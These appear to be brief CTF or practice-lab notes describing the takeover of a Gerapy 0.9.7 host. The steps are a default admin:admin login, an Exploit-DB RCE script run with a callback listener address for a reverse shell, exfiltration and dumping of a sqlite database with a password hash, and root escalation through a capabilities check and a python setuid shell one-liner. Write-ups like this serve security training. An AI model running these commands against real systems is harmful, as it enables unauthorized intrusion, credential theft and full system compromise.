ports 8000 and 22 open
visit website on port 8000, we see a login portal, admin:admin works
we see it is gerapy v 0.9.7, look for exploits, and we find an rce
https://www.exploit-db.com/raw/50640
`python exploit_rce_gerapy_.9.7.py -t 192.168.160.24 -p 8000 -L 192.168.45.247 -P 1234`

and, we're app!

---
in there, we find a sqlite3 database in /home/app/gerapy/db
we send it over to kali
`sqlite3 db.sqlite3`
.databases
.tables
.dump
Only thing interesting we find is this, we'll see if that's useful -- ( it wasnt)
```text
INSERT INTO auth_user VALUES(1,'pbkdf2_sha256$150000$ywalf7yp3z6D$encB0AjAbzkuCQQp2rZrUESEvxrt/6WmeNy+SRWX4ko=',NULL,1,'admin','','admin@gerapy.com',1,1,'2023-06-13 21:05:20.520852','');
```

privesc was with `getcap -r / 2>/dev/null`
gtfobins - `python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`